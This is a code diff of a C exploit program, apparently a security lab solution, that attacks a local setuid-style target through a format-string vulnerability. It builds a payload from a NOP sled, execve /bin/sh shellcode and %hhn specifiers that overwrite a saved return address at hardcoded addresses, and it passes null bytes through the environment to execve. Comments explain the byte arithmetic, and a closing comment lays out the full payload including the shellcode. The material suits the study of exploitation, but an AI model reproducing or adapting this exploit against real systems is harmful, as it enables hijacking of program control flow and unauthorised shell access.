@@ -36,7 +36,7 @@
 int main(void)
 {
   char *args[3];
-  char *env[20];
+  char *env[17];
 
   char buf[256];
 
@@ -45,9 +45,38 @@ int main(void)
       buf[i] = '\x90';
   }
 
+  // Encode format string to achieve desired hack
   /*
-    Inject shellcode at the beginning of the buffer;
-    Therefore the address of shellcode will be 0x3021f9a0;
+    Partition 0x3021fa30:
+    0x30: 48
+    0xfa: 250
+    0x21: 33
+    0x30: 48
+
+    Calculate the difference as %hhn writes the culmulative printed length:
+    0x30 - 40 = 8
+    0xfa - 0x30 = 202
+    0x121 - 0x0fa = 39
+    0x30 - 0x21 = 15
+
+    Here in the 3rd calculation, 39 is added.
+    So the culmulative length is 0xfa + 39 = 289 (0x121), exceeding 1 byte in size.
+    Specifier %hhn writes LSB, which is just 0x21. Same thing in the 1st calculation.
+  */
+  char format_content[] = "%40x%8x%hhn%202x%hhn%39x%hhn%15x%hhn";
+
+  /*
+    Copy it starting from the 28th bytes of the buffer so that the format specifiers
+    would start from the 60th byte of formatString[]:
+    0 ~ 27 -> 28 bytes, 28 + 32 = 60 bytes -> 0 ~ 59 of formatString.
+  */
+  for (int i = 0; i < 36; i++) {
+    buf[28 + i] = format_content[i];
+  }
+
+  /*
+    Inject shellcode at 144th byte;
+    By calculation, the address of shellcode will be 0x3021f9a0 + 144 bytes = 0x3021fa30;
     This address will be used to overwrite the return address.
 
     The first 4 bytes are left because the format string is read starting from 60th bytes,
@@ -55,79 +84,130 @@ int main(void)
     which results in 4 null bytes starting from 60th.
     Therefore another 4 bytes are used to complete the alignment as 4 + 4 = 8.
   */
-  int shellcode_len = strlen(shellcode);
-  for(int i = 0; i < strlen(shellcode); i++){
-		buf[4 + i] = shellcode[i];
+  for(int i = 0; i < 45; i++){
+		buf[112 + i] = shellcode[i];
 	}
-
-  // Encode format string to achieve desired hack
-  /*
-    Partition 0x3021f9a0:
-    0xa0: 160
-    0xf9: 249
-    0x21: 33
-    0x30: 48
-
-    Calculate the difference as %hhn writes the culmulative printed length:
-    0xa0 - 45 - 40 = 75
-    0xf9 - 0xa0 = 89
-    0x121 - 0x0f9 = 40
-    0x30 - 0x21 = 15
-
-    Here in the 3rd calculation, 40 is added.
-    So the culmulative length is 0xf9 + 40 = 289 (0x121), exceeding 1 byte in size.
-    Specifier %hhn writes LSB, which is just 0x21.
-  */
-  char format_content[] = "%40x%75x%hhn%89x%hhn%40x%hhn%15x%hhn";
-  memcpy(&buf[49], format_content, strlen(format_content));
 
   buf[255] = '\x00';
 
   // Return address to be overwritten: 0x3021f988 (rip within snprintf frame)
-  char ret_addr_1[5] = "\x88\xf9\x21\x30";
-  char ret_addr_2[5] = "\x89\xf9\x21\x30";
-  char ret_addr_3[5] = "\x8a\xf9\x21\x30";
-  char ret_addr_4[5] = "\x8b\xf9\x21\x30";
+  char ret_addr_1[] = "\x88\xf9\x21\x30";
+  char ret_addr_2[] = "\x89\xf9\x21\x30";
+  char ret_addr_3[] = "\x8a\xf9\x21\x30";
+  char ret_addr_4[] = "\x8b\xf9\x21\x30";
 
   // // Return address to be overwritten: 0x3021fea8 (rip within foo frame)
-  // char addr_1[] = "\xa8\xfe\x21\x30";
-  // char addr_2[] = "\xa9\xfe\x21\x30";
-  // char addr_3[] = "\xaa\xfe\x21\x30";
-  // char addr_4[] = "\xab\xfe\x21\x30";
+  // char ret_addr_1[] = "\xa8\xfe\x21\x30";
+  // char ret_addr_2[] = "\xa9\xfe\x21\x30";
+  // char ret_addr_3[] = "\xaa\xfe\x21\x30";
+  // char ret_addr_4[] = "\xab\xfe\x21\x30";
 
   // Encode env to accommodate null bytes
   args[0] = TARGET; 
   args[1] = ret_addr_1; 
   args[2] = NULL;
-  
+
   env[0] = "\x00";
   env[1] = "\x00";
   env[2] = "\x00";
-  env[3] = "fffffff";
-  // Here the size is 7 bytes for 'A' + 1 byte for NULL = 8 Bytes
-  
-  env[4] =  ret_addr_2;
+
+  env[3] =  ret_addr_2;
+  env[4] = "\x00";
   env[5] = "\x00";
   env[6] = "\x00";
-  env[7] = "\x00";
-  env[8] = "fffffff";
 
-  env[9] = ret_addr_3;
+  env[7] = ret_addr_3;
+  env[8] = "\x00";
+  env[9] = "\x00";
   env[10] = "\x00";
-  env[11] = "\x00";
+
+  env[11] = ret_addr_4;
   env[12] = "\x00";
-  env[13] = "fffffff";
+  env[13] = "\x00";
+  env[14] = "\x00";
 
-  env[14] = ret_addr_4;
-  env[15] = "\x00";
-  env[16] = "\x00";
-  env[17] = "\x00";
-
-  env[18] = buf;
-  env[19] = NULL;
+  env[15] = buf;
+  env[16] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
   return 0;
 }
+
+/*
+  Desired formatString content:
+  \x88\xf9\x21\x30 <- return address 1
+  \x00\x00\x00\x00
+  \x89\xf9\x21\x30 <- return address 2
+  \x00\x00\x00\x00
+  \x8a\xf9\x21\x30 <- return address 3
+  \x00\x00\x00\x00
+  \x8b\xf9\x21\x30 <- return address 4
+  \x00\x00\x00\x00
+  \x90\x90\x90\x90 <- NOPs
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x25\x34\x30\x78 <- Start of the specifiers "%40x%8x%hhn%202x%hhn%39x%hhn%15x%hhn"
+  \x25\x38\x78\x25
+  \x68\x68\x6e\x25
+  \x32\x30\x32\x78
+  \x25\x68\x68\x6e
+  \x25\x33\x39\x78
+  \x25\x68\x68\x6e
+  \x25\x31\x35\x78
+  \x25\x68\x68\x6e
+  \x90\x90\x90\x90 <- NOPs
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \xeb\x1f\x5e\x89 <- Start of shellcode
+  \x76\x08\x31\xc0
+  \x88\x46\x07\x89
+  \x46\x0c\xb0\x0b
+  \x89\xf3\x8d\x4e
+  \x08\x8d\x56\x0c
+  \xcd\x80\x31\xdb
+  \x89\xd8\x40\xcd
+  \x80\xe8\xdc\xff
+  \xff\xff\x2f\x62
+  \x69\x6e\x2f\x73
+  \x68\x90\x90\x90 <- End of shellcode
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+  \x90\x90\x90\x90
+
+*/
